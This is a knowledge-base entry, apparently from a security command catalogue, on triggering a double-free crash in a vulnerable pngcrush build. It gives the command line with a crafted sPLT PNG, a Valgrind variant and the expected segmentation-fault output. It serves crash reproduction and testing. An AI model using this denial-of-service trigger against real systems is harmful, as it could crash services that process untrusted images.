---
data: ./pngcrush -reduce -brute ps1n0g08.png /dev/null
tags:
  - dos
  - pngcrush
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:37.368Z'
id: ee2a425e-7842-4000-8803-4a0a1d0eb2f1
verified: false
validated: true
submitted: true
---
# pngcrush-process-splt-png

## Command

```bash
./pngcrush -reduce -brute ps1n0g08.png /dev/null
```

## Description

This command runs the vulnerable pngcrush to process a PNG file containing an sPLT chunk, triggering a double-free vulnerability that results in a segmentation fault and denial-of-service. Use it to demonstrate the crash in testing environments.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-reduce` | Enables reduction of critical PNG chunks for optimization | Yes |
| `-brute` | Applies brute-force method selection for compression trials | Yes |
| `ps1n0g08.png` | Input PNG file with sPLT chunk that triggers the vuln | Yes |
| `/dev/null` | Discards the output file to focus on processing | Yes |

## Examples

### Basic Usage

```bash
./pngcrush -reduce -brute ps1n0g08.png /dev/null
```

### Advanced Usage

```bash
valgrind ./pngcrush -reduce -brute ps1n0g08.png output.png
```

(Run under Valgrind for analysis, specifying actual output file if needed.)

## Expected Output

Optimization progress like 'Processing ps1n0g08.png' followed by 'Best pngcrush method = 105 ... total 3.320 sec.', then 'Segmentation fault (core dumped)' due to double-free in png_free_data.

## Related

- [[procedures/Trigger-Double-Free-Crash-in-pngcrush]]
- [[procedures/Analyze-Memory-Errors-with-Valgrind]]
